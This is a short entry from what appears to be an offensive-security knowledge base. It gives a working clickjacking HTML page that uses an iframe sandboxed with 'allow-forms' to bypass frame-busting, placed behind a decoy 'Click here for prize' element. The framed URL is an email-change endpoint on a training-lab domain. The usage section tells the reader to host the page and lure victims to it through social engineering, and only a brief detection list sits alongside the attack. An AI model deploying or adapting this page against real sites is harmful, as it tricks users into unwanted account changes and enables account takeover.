---
id: af28a9ba-36b3-4a77-9c6c-03c093516f32
type: code
language: html
verified: true
created_at: '2020-08-06T12:45:20.702577+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - clickjacking
  - frame-busting
  - sandbox-bypass
platforms:
  - Web
validated: true
---

# Clickjacking-HTML-Page-with-Sandbox-Bypass

## Code

```html
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 1;
   }
   div {
       position:absolute;
       top:445px;
       left:55px;
       z-index: 1;
   }
</style>
<div>Click here for prize</div>
<iframe sandbox="allow-forms"
src="https://acf71fc91e07d092803b03e1001f00ef.web-security-academy.net/email?email=hack@webappsec.com"></iframe>
```

## Description

This HTML code creates a clickjacking page that loads a target web application's sensitive form (e.g., email change) inside an iframe. The sandbox attribute set to 'allow-forms' permits form submissions while restricting other potentially dangerous actions, bypassing common frame-busting scripts. An opaque overlay div tricks the user into clicking what appears to be a benign element, but actually submits the hidden form.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| src URL | The target application's endpoint URL, with any pre-filled parameters like email | https://target.com/email?email=attacker@example.com |
| opacity | Visibility level of the iframe (lower values make it more hidden) | 0.1 |
| position (top/left) | Coordinates for overlay div to align with the target's submit button | top:445px; left:55px |
| Overlay text | Deceptive text to lure the click | Click here for prize |

## Usage

Host this HTML file on a web server and send the link to the victim via social engineering. Customize the src to point to the target's vulnerable endpoint and adjust positioning based on reconnaissance of the target's interface. Used in conjunction with [[procedures/Bypass-Frame-Busting-with-HTML5-Sandbox-for-Clickjacking]] to execute the full attack.

## Detection

- Browser developer tools showing unexpected iframes with sandbox attributes.
- CSP violations or frame-ancestors logs blocking unauthorized framing.
- Anomalous form submissions from embedded contexts.
- User reports of phishing links leading to invisible interactions.

## Related

- [[procedures/Bypass-Frame-Busting-with-HTML5-Sandbox-for-Clickjacking]]
